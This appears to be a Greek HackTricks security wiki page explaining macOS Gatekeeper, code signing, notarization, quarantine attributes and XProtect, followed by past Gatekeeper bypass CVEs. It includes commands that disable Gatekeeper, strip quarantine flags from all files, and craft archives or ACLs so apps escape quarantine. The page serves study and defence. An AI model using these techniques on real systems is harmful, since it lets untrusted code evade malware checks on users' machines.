# macOS Gatekeeper / Καραντίνα / XProtect

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Gatekeeper

Το **Gatekeeper** είναι μια λειτουργία ασφαλείας που αναπτύχθηκε για τα λειτουργικά συστήματα Mac, σχεδιασμένη για να εξασφαλίζει ότι οι χρήστες **εκτελούν μόνο αξιόπιστο λογισμικό** στα συστήματά τους. Λειτουργεί με τον τρόπο της **επικύρωσης του λογισμικού** που ένας χρήστης κατεβάζει και προσπαθεί να ανοίξει από **πηγές έξω από το App Store**, όπως μια εφαρμογή, ένα πρόσθετο ή ένα πακέτο εγκατάστασης.

Η κύρια μηχανή του Gatekeeper βρίσκεται στη διαδικασία της **επαλήθευσης**. Ελέγχει αν το κατεβασμένο λογισμικό είναι **υπογεγραμμένο από αναγνωρισμένο προγραμματιστή**, εξασφαλίζοντας την αυθεντικότητα του λογισμικού. Επιπλέον, ελέγχει εάν το λογισμικό έχει **επικυρωθεί από την Apple**, επιβεβαιώνοντας ότι είναι απαλλαγμένο από γνωστό κακόβουλο περιεχόμενο και δεν έχει τροποποιηθεί μετά την επικύρωση.

Επιπλέον, το Gatekeeper ενισχύει τον έλεγχο και την ασφάλεια του χρήστη με το να **ζητά από τους χρήστες να εγκρίνουν το άνοιγμα** του κατεβασμένου λογισμικού για πρώτη φορά. Αυτός ο προστατευτικός μηχανισμός βοηθά στο να αποτραπεί οι χρήστες από το να εκτελέσουν κατά λάθος πιθανώς επικίνδυνο εκτελέσιμο κώδικα που θα μπορούσαν να έχουν παρεξηγήσει ως ακίνδυνο αρχείο δεδομένων.

### Υπογραφές Εφαρμογών

Οι υπογραφές εφαρμογών, επίσης γνωστές ως υπογραφές κώδικα, είναι ένα κρίσιμο στοιχείο της υποδομής ασφαλείας της Apple. Χρησιμοποιούνται για το **έλεγχο της ταυτότητας του συγγραφέα του λογισμικοϋ** (του προγραμματιστή) και για να εξασφαλίσουν ότι ο κώδικας δεν έχει τροποποιηθεί από την τελευταία υπογραφή.

Έτσι λειτουργεί:

1. **Υπογραφή της Εφαρμογής:** Όταν ένας προγραμματιστής είναι έτοιμος να διανείμει την εφαρμογή του, **υπογράφει την εφαρμογή χρησιμοποιώντας έναν ιδιωτικό κλειδί**. Αυτό το ιδιωτικό κλειδί συσχετίζεται με ένα **πιστοποιητικό που εκδίδει η Apple στον προγραμματιστή** όταν εγγράφεται στο Apple Developer Program. Η διαδικασία υπογραφής περιλαμβάνει τη δημιουργία ενός κρυπτογραφικού κατακερματισμού όλων των τμημάτων της εφαρμογής και την κρυπτογράφηση αυτού του κατακερματισμού με το ιδιωτικό κλειδί του προγραμματιστή.
2. **Διανομή της Εφαρμογής:** Η υπογεγραμμένη εφαρμογή διανέμεται στους χρήστες μαζί με το πιστοποιητικό του προγραμματιστή, που περιέχει το αντίστοιχο δημόσιο κλειδί.
3. **Επαλήθευση της Εφαρμογής:** Όταν ένας χρήστης κατεβάζει και προσπαθεί να εκτελέσει την εφαρμογή, το λειτουργικό σύστημα Mac χρησιμοποιεί το δημόσιο κλειδί από το πιστοποιητικό του προγραμματιστή για να αποκρυπτογραφήσει τον κατακερματισμό. Στη συνέχεια, υπολογίζει ξανά τον κατακερματισμό με βάση την τρέχουσα κατάσταση της εφαρμογής και συγκρίνει αυτόν με τον αποκρυπτογραφημένο κατακερματισμό. Αν ταιριάζουν, σημαίνει ότι **η εφαρμογή δεν έχει τροποποιηθεί** από την υπογραφή του προγραμματιστή και το σύστημα επιτρέπει την εκτέλεση της εφαρμογής.

Οι υπογραφές εφαρμογών είναι ένα ουσιώδες μέρος της τεχνολογίας Gatekeeper της Apple. Όταν ένας χρήστης προσπαθεί να **ανοίξει μια εφαρμογή που έχει κατεβάσει από το internet**, το Gatekeeper επαληθεύει την υπογραφή της εφαρμογής. Αν είναι υπογεγραμμένη με ένα πιστοποιητικό που έχει εκδώσει η Apple σε έναν γνωστό προγραμματιστή και ο κώδικας δεν έχει τροποποιηθεί, το Gatekeeper επιτρέπει την εκτέλεση της εφαρμογής. Διαφορετικά, αποκλείει την εφαρμογή και ειδοποιεί τον χρήστη.

Από το macOS Catalina και μετά, το **Gatekeeper ελέγχει επίσης εάν η εφαρμογή έχει υποβληθεί σε επικύρωση** από την Apple, προσθέτοντας ένα επιπλέον επίπεδο ασφαλείας. Η διαδικασία επικύρωσης ελέγχει την εφαρμογή για γνωστά θέματα ασφαλείας και κακόβουλο κώδικα, και αν αυτοί οι έλεγχοι περάσουν, η Apple προσθέτει ένα εισιτήριο στην εφαρμογή που το Gatekeeper μπορεί να επαληθεύσει.

#### Έλεγχος Υπογραφών

Όταν ελέγχετε κάποιο **δείγμα κακόβουλου λογισμικοϋ** πρέπει πάντα να **ελέγχετε την υπογραφή** του δυαδικού καθώς ο **προγραμματιστής** που το υπέγραψε μπορεί να έχει ήδη **σχέση** με **κακόβουλο λογισμικό**.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Επισημοποίηση

Η διαδικασία επισημοποίησης της Apple λειτουργεί ως ένα επιπλέον μέτρο προστασίας για τους χρήστες από ενδεχόμενο επιβλαβές λογισμικό. Περιλαμβάνει τον **προγραμματιστή να υποβάλει την εφαρμογή του για εξέταση** από την **Υπηρεσία Επισήμανσης της Apple**, η οποία δεν πρέπει να μπερδευτεί με την Αναθεώρηση Εφαρμογών. Αυτή η υπηρεσία είναι ένα **αυτοματοποιημένο σύστημα** που ελέγχει προσεκτικά το υποβαλλόμενο λογισμικό για την παρουσία **κακόβουλου περιεχομένου** και οποιωνδήποτε πιθανών προβλημάτων με την υπογραφή κώδικα.

Αν το λογισμικό **περάσει** αυτόν τον έλεγχο χωρίς να προκαλέσει ανησυχίες, η Υπηρεσία Επισήμανσης δημιουργεί ένα εισιτήριο επισημοποίησης. Στη συνέχεια, ο προγραμματιστής πρέπει να **επισυνάψει αυτό το εισιτήριο στο λογισμικό του**, μια διαδικασία γνωστή ως 'συρραφή.' Επιπλέον, το εισιτήριο επισημοποίησης δημοσιεύεται επίσης στο διαδίκτυο όπου το Gatekeeper, η τεχνολογία ασφαλείας της Apple, μπορεί να το ανακτήσει.
Κατά την πρώτη εγκατάσταση ή εκτέλεση του λογισμικού από τον χρήστη, η ύπαρξη του εισιτηρίου επικύρωσης - είτε ως συνδεδεμένο με το εκτελέσιμο είτε βρέθηκε online - **ενημερώνει το Gatekeeper ότι το λογισμικό έχει επικυρωθεί από την Apple**. Ως αποτέλεσμα, το Gatekeeper εμφανίζει ένα περιγραφικό μήνυμα στο διάλογο αρχικής εκκίνησης, υποδεικνύοντας ότι το λογισμικό έχει υποβληθεί σε ελέγχους για κακόβουλο περιεχόμενο από την Apple. Με αυτόν τον τρόπο, η διαδικασία αυτή ενισχύει την εμπιστοσύνη του χρήστη στην ασφάλεια του λογισμικοώ που εγκαθιστά ή εκτελεί στα συστήματά τους.

### Απαρίθμηση του GateKeeper

Το GateKeeper αποτελεί τόσο, **πολλαπλά στοιχεία ασφαλείας** που εμποδίζουν την εκτέλεση μη αξιόπιστων εφαρμογών όσο και **ένα από τα στοιχεία**.

Είναι δυνατόν να δείτε την **κατάσταση** του GateKeeper με:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
Σημειώστε ότι οι έλεγχοι υπογραφής του GateKeeper πραγματοποιούνται μόνο σε **αρχεία με το χαρακτηριστικό Καραντίνας**, όχι σε κάθε αρχείο.
{% endhint %}

Ο GateKeeper θα ελέγξει αν σύμφωνα με τις **προτιμήσεις & την υπογραφή** μια δυαδική μπορεί να εκτελεστεί:

<figure><img src="../../../.gitbook/assets/image (1147).png" alt=""><figcaption></figcaption></figure>

Η βάση δεδομένων που διατηρεί αυτή τη διαμόρφωση βρίσκεται στο **`/var/db/SystemPolicy`**. Μπορείτε να ελέγξετε αυτή τη βάση δεδομένων ως ριζοχρήστης με:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Σημειώστε πως ο πρώτος κανόνας τελείωσε σε "**App Store**" και ο δεύτερος σε "**Developer ID**" και ότι στην προηγούμενη εικόνα ήταν **ενεργοποιημένη η εκτέλεση εφαρμογών από το App Store και από πιστοποιημένους προγραμματιστές**.\
Αν **τροποποιήσετε** αυτή τη ρύθμιση σε App Store, οι κανόνες "**Notarized Developer ID" θα εξαφανιστούν**.

Υπάρχουν επίσης χιλιάδες κανόνες τύπου GKE:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Αυτά είναι τα hashes που προέρχονται από τα **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** και **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

Ή μπορείτε να καταχωρίσετε τις προηγούμενες πληροφορίες με:
```bash
sudo spctl --list
```
Οι επιλογές **`--master-disable`** και **`--global-disable`** του **`spctl`** θα απενεργοποιήσουν εντελώς αυτούς τους ελέγχους υπογραφής:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Όταν είναι πλήρως ενεργοποιημένο, θα εμφανιστεί μια νέα επιλογή:

<figure><img src="../../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

Είναι δυνατόν να **ελεγχθεί αν μια εφαρμογή θα επιτραπεί από το GateKeeper** με:
```bash
spctl --assess -v /Applications/App.app
```
Είναι δυνατόν να προστεθούν νέοι κανόνες στο GateKeeper για να επιτρέπεται η εκτέλεση συγκεκριμένων εφαρμογϽν.
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### Αρχεία Καραντίνας

Κατά την **λήψη** μιας εφαρμογής ή αρχείου, συγκεκριμένες εφαρμογές macOS όπως περιηγητές ιστού ή προγράμματα email **επισυνάπτουν ένα επεκτεινόμενο χαρακτηριστικό αρχείου**, γνωστό ως "**σημαία καραντίνας**," στο κατεβασμένο αρχείο. Αυτό το χαρακτηριστικό λειτουργεί ως μέτρο ασφαλείας για να **επισημάνει το αρχείο** ως προερχόμενο από μη έμπιστη πηγή (το διαδίκτυο) και πιθανώς να φέρει κινδύνους. Ωστόσο, όχι όλες οι εφαρμογές επισυνάπτουν αυτό το χαρακτηριστικό, για παράδειγμα, τα κοινά προγράμματα πελατών BitTorrent συνήθως παρακάμπτουν αυτήν τη διαδικασία.

**Η παρουσία μιας σημαίας καραντίνας ειδοποιεί το χαρακτηριστικό ασφαλείας Gatekeeper του macOS όταν ο χρήστης προσπαθεί να εκτελέσει το αρχείο**.

Στην περίπτωση όπου η **σημαία καραντίνας δεν είναι παρούσα** (όπως με αρχεία που λήφθηκαν μέσω ορισμένων πελατών BitTorrent), οι **έλεγχοι του Gatekeeper ενδέχεται να μην πραγματοποιηθούν**. Έτσι, οι χρήστες θα πρέπει να είναι προσεκτικοί όταν ανοίγουν αρχεία που έχουν ληφθεί από λιγότερο ασφαλείς ή άγνωστες πηγές.

{% hint style="info" %}
**Η επαλήθευση** της **εγκυρότητας** των υπογραφών κώδικα είναι μια **επεξεργασία μεγάλου όγκου πόρων** που περιλαμβάνει τη δημιουργία κρυπτογραφικών **κατακερματισμών** του κώδικα και όλων των συσκευασμένων πόρων του. Επιπλέον, η επαλήθευση της εγκυρότητας του πιστοποιητικού περιλαμβάνει μια **διαδικτυακή επαλήθευση** στους διακομιστές της Apple για να δει αν έχει ανακληθεί μετά την έκδοσή του. Για αυτούς τους λόγους, ο πλήρης έλεγχος υπογραφής κώδικα και επικύρωσης δεν είναι **εφικτός να εκτελείται κάθε φορά που μια εφαρμογή εκκινείται**.

Γι' αυτό, αυτοί οι έλεγχοι **εκτελούνται μόνο κατά την εκτέλεση εφαρμογών με το χαρακτηριστικό καραντίνας**.
{% endhint %}

{% hint style="warning" %}
Αυτό το χαρακτηριστικό πρέπει να **ορίζεται από την εφαρμογή που δημιουργεί/κατεβάζει** το αρχείο.

Ωστόσο, τα αρχεία που είναι σε λειτουργία άμμου θα έχουν αυτό το χαρακτηριστικό ορισμένο σε κάθε αρχείο που δημιουργούν. Και οι μη αμμολογημένες εφαρμογές μπορούν να το ορίσουν μόνες τους, ή να καθορίσουν το [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) κλειδί στο **Info.plist** το οποίο θα κάνει το σύστημα να ορίσει το επεκτεινόμενο χαρακτηριστικό `com.apple.quarantine` στα αρχεία που δημιουργούν,
{% endhint %}

Είναι δυνατόν να **ελέγξετε την κατάστασή του και να ενεργοποιήσετε/απενεργοποιήσετε** (απαιτείται root) με:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Μπορείτε επίσης **να βρείτε αν ένα αρχείο έχει το επεκταμένο χαρακτηριστικό καραντίνας** με:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Ελέγξτε τη **τιμή** των **επεκταμένων** **χαρακτηριστικών** και βρείτε την εφαρμογή που έγραψε το χαρακτηριστικό καραντίνα με:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Πράγματι, ένας διεργασία "μπορεί να ορίσει σημαίες καραντίνας στα αρχεία που δημιουργεί" (προσπάθησα να εφαρμόσω τη σημαία USER\_APPROVED σε ένα δημιουργημένο αρχείο αλλά δεν την εφαρμόζει):

<details>

<summary>Κώδικας Πηγής εφαρμογής σημαίες καραντίνας</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

Και **αφαιρέστε** αυτό το χαρακτηριστικό με:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Και βρείτε όλα τα αρχεία σε καραντίνα με:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Οι πληροφορίες καραντίνας αποθηκεύονται επίσης σε μια κεντρική βάση δεδομένων που διαχειρίζεται από το LaunchServices στο **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**.

#### **Quarantine.kext**

Η επέκταση πυρήνα είναι διαθέσιμη μόνο μέσω της **προσωρινής μνήμης πυρήνα στο σύστημα**. Ωστόσο, μπορείτε να κατεβάσετε το **Kernel Debug Kit από τη διεύθυνση https://developer.apple.com/**, το οποίο θα περιέχει μια συμβολοποιημένη έκδοση της επέκτασης.

### XProtect

Το XProtect είναι μια ενσωματωμένη λειτουργία **αντι-κακόβουλου λογισμικού** στο macOS. Το XProtect **ελέγχει οποιαδήποτε εφαρμογή όταν εκτελείται για πρώτη φορά ή τροποποιείται έναντι της βάσης δεδομένων** του γνωστού κακόβουλου λογισμικού και ανθυγιεινών τύπων αρχείων. Όταν κατεβάζετε ένα αρχείο μέσω συγκεκριμένων εφαρμογών, όπως το Safari, το Mail ή το Messages, το XProtect σαρώνει αυτόματα το αρχείο. Αν ταιριάζει με οποιοδήποτε κακόβουλο λογισμικό στη βάση δεδομένων του, το XProtect θα **εμποδίσει το αρχείο από την εκτέλεση** και θα σας ειδοποιήσει για τον κίνδυνο.

Η βάση δεδομένων του XProtect **ενημερώνεται τακτικά** από την Apple με νέους ορισμούς κακόβουλου λογισμικού, και αυτές οι ενημερώσεις κατεβάζονται και εγκαθίστανται αυτόματα στο Mac σας. Αυτό εξασφαλίζει ότι το XProtect είναι πάντα ενημερωμένο με τις τελευταίες γνωστές απειλές.

Ωστόσο, αξίζει να σημειωθεί ότι το **XProtect δεν είναι μια πλήρως λειτουργική λύση αντιιών**. Ελέγχει μόνο για μια συγκεκριμένη λίστα γνωστών απειλών και δεν πραγματοποιεί σάρωση κατά την πρόσβαση όπως η πλειονότητα των λογισμικών αντιιών.

Μπορείτε να λάβετε πληροφορίες σχετικά με την τελευταία ενημέρωση του XProtect εκτελώντας:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

Το XProtect βρίσκεται σε προστατευμένη τοποθεσία SIP στο **/Library/Apple/System/Library/CoreServices/XProtect.bundle** και μέσα στο bundle μπορείτε να βρείτε πληροφορίες που χρησιμοποιεί το XProtect:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Επιτρέπει σε κώδικα με αυτά τα cdhashes να χρησιμοποιούν παλαιές εξουσιοδοτήσεις.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Λίστα με πρόσθετα που απαγορεύεται να φορτωθούν μέσω του BundleID και TeamID ή ενδεικτικός ελάχιστος αριθμός έκδοσης.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Κανόνες Yara για τον εντοπισμό κακόβουλου λογισμικού.
* **`XProtect.bundle/Contents/Resources/gk.db`**: Βάση δεδομένων SQLite3 με hashes αποκλεισμένων εφαρμογών και TeamIDs.

Σημειώστε ότι υπάρχει μια άλλη εφαρμογή στο **`/Library/Apple/System/Library/CoreServices/XProtect.app`** που σχετίζεται με το XProtect και δεν συμμετέχει στη διαδικασία του Gatekeeper.

### Όχι Gatekeeper

{% hint style="danger" %}
Σημειώστε ότι ο Gatekeeper **δεν εκτελείται κάθε φορά** που εκτελείτε μια εφαρμογή, μόνο το _**AppleMobileFileIntegrity**_ (AMFI) θα ελέγχει μόνο τις **υπογραφές εκτελέσιμου κώδικα** όταν εκτελέσετε μια εφαρμογή που έχει ήδη εκτελεστεί και ελεγχθεί από το Gatekeeper.
{% endhint %}

Συνεπώς, παλαιότερα ήταν δυνατό να εκτελείτε μια εφαρμογή για να την κρατήσετε στη μνήμη cache με το Gatekeeper, στη συνέχεια **να τροποποιήσετε μη εκτελέσιμα αρχεία της εφαρμογής** (όπως τα αρχεία Electron asar ή NIB) και αν δεν υπήρχαν άλλες προστασίες, η εφαρμογή εκτελούνταν με τις **κακόβουλες** προσθήκες.

Ωστόσο, τώρα αυτό δεν είναι δυνατό επειδή το macOS **αποτρέπει την τροποποίηση αρχείων** μέσα στα bundles εφαρμογών. Έτσι, αν προσπαθήσετε την επίθεση [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), θα διαπιστώσετε ότι πλέον δεν είναι δυνατό να την εκμεταλλευτείτε επειδή μετά την εκτέλεση της εφαρμογής για να την κρατήσετε στη μνήμη cache με το Gatekeeper, δεν θα μπορείτε να τροποποιήσετε το bundle. Και αν αλλάξετε για παράδειγμα το όνομα του φακέλου Contents σε NotCon (όπως υποδεικνύεται στην εκμετάλλευση), και στη συνέχεια εκτελέσετε το κύριο δυαδικό αρχείο της εφαρμογής για να την κρατήσετε στη μνήμη cache με το Gatekeeper, θα προκαλέσει ένα σφάλμα και δεν θα εκτελεστεί.

## Παρακάμψεις Gatekeeper

Οποιοδήποτε τρόπος παράκαμψης του Gatekeeper (καταφέρνοντας να κάνετε τον χρήστη να κατεβάσει κάτι και να το εκτελέσει όταν ο Gatekeeper θα έπρεπε να το απορρίψει) θεωρείται μια ευπάθεια στο macOS. Αυτά είναι μερικά CVEs που ανατέθηκαν σε τεχνικές που επέτρεπαν την παράκαμψη του Gatekeeper στο παρελθόν:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Παρατηρήθηκε ότι εάν χρησιμοποιηθεί το **Archive Utility** για την εξαγωγή, τα αρχεία με **μονοπάτια που υπερβαίνουν τους 886 χαρακτήρες** δεν λαμβάνουν το επέκτασης com.apple.quarantine. Αυτή η κατάσταση επιτρέπει απρόθεντα σε αυτά τα αρχεία να **παρακάμψουν τους ελέγχους ασφαλείας του Gatekeeper**.

Ελέγξτε την [**αρχική αναφορά**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) για περισσότερες πληροφορίες.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Όταν δημιουργείται μια εφαρμογή με το **Automator**, οι πληροφορίες σχετικά με το τι χρειάζεται για να εκτελεστεί βρίσκονται μέσα στο `application.app/Contents/document.wflow` και όχι στο εκτελέσιμο. Το εκτελέσιμο είναι απλά ένα γενικό δυαδικό αρχείο Automator που ονομάζεται **Automator Application Stub**.

Συνεπώς, θα μπορούσατε να κάνετε το `application.app/Contents/MacOS/Automator\ Application\ Stub` **να δείχνει με ένα συμβολικό σύνδεσμο σε ένα άλλο Automator Application Stub μέσα στο σύστημα** και θα εκτελεί αυτό που βρίσκεται μέσα στο `document.wflow` (το σενάριό σας) **χωρίς να ενεργοποιήσει το Gatekeeper** επειδή το πραγματικό εκτελέσιμο δεν έχει το quarantine xattr.

Παράδειγμα αναμενόμενης τοποθεσίας: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Ελέγξτε την [**αρχική αναφορά**](https://ronmasas.com/posts/bypass-macos-gatekeeper) για περισσότερες πληροφορίες.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Σε αυτή την παράκαμψη δημιουργήθηκε ένα αρχείο zip με μια εφαρμογή που ξεκινά τη συμπίεση από το `application.app/Contents` αντί από το `application.app`. Έτσι, η **προστασία καραντίνας** εφαρμόστηκε σε όλα τα **αρχεία από το `application.app/Contents`** αλλά **όχι στο `application.app`**, το οποίο ελέγχετο από το Gatekeeper, οπότε το Gatekeeper παρακάμφθηκε επειδή όταν ενεργοποιήθηκε το `application.app` **δεν είχε το χαρακτηριστικό καραντίνας.**
```bash
zip -r test.app/Contents test.zip
```
Ελέγξτε την [**αρχική αναφορά**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) για περισσότερες πληροφορίες.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Ακόμα κι αν τα στοιχεία είναι διαφορετικά, η εκμετάλλευση αυτής της ευπάθειας είναι πολύ παρόμοια με την προηγούμενη. Σε αυτήν την περίπτωση θα δημιουργήσουμε ένα Apple Archive από το **`application.app/Contents`** έτσι ώστε το **`application.app` να μην λάβει το χαρακτηριστικό καραντίνας** όταν αποσυμπιέζεται από το **Archive Utility**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Ελέγξτε την [**αρχική έκθεση**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) για περισσότερες πληροφορίες.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

Το ACL **`writeextattr`** μπορεί να χρησιμοποιηθεί για να αποτρέψει οποιονδήποτε από το να γράψει ένα χαρακτηριστικό σε ένα αρχείο:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Επιπλέον, η μορφή αρχείου **AppleDouble** αντιγράφει ένα αρχείο συμπεριλαμβανομένων των ACEs του.

Στον [**πηγαίο κώδικα**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) είναι δυνατόν να δούμε ότι η αναπαράσταση κειμένου ACL που αποθηκεύεται μέσα στο xattr με το όνομα **`com.apple.acl.text`** θα οριστεί ως ACL στο αποσυμπιεσμένο αρχείο. Έτσι, αν συμπιέσετε μια εφαρμογή σε ένα αρχείο zip με τη μορφή αρχείου **AppleDouble** με ένα ACL που εμποδίζει άλλα xattrs να γραφτούν σε αυτό... το xattr καραντίνας δεν ορίστηκε στην εφαρμογή:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

